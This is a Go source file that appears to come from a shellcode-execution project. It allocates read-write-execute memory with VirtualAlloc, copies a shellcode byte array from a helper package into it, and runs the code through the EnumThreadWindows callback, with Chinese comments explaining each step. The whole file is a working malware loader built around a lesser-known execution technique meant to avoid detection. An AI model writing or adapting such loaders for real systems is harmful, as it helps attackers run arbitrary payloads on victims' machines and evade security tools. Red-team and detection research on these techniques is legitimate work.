package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE) // 使用 0x1000 代替 MEM_COMMIT，0x40 代替 PAGE_EXECUTE_READWRITE

	// 处理 op 数组
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 使用 EnumThreadWindows 调用 shellcode
	user32, _ := syscall.LoadDLL("user32.dll")
	enumThreadWindows, _ := user32.FindProc("EnumThreadWindows")
	ret, _, err := enumThreadWindows.Call(0, addr, 0)
	if ret == 0 {
		println("EnumThreadWindows failed:", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
